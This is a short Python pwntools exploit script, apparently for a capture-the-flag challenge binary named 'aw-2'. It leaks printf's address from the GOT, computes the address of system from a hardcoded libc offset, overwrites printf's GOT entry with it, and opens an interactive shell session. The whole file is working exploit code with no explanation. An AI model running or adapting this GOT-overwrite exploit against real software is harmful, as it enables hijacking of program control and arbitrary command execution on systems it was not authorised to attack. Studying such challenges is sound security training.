#!/usr/bin/env python

from pwn import *


context.terminal = ['tmux', 'splitw', '-h']
p = process('./aw-2')
#p = process('./aw-x')
#gdb.attach(p, "b *main")

print(p.recv())

got_printf = p.elf.got['printf']

p.sendline("100")
print(p.recv())
p.sendline(hex(got_printf))
p.recvline()

#i=0
#while i < 100:
#    data = u64(p.recvn(8))
#    print(hex(data))
#    i += 1

#exit()

addr = u64(p.recvn(8))

print(hex(addr))

offset = 0x7f0817eeb390 - 0x7f0817efb800

addr_system = addr + offset

p.sendline("8")

p.sendline(hex(got_printf))

p.sendline(p64(addr_system))

# print(p.recv())

# export PATH=$PATH:`pwd`

p.interactive()

#exit()
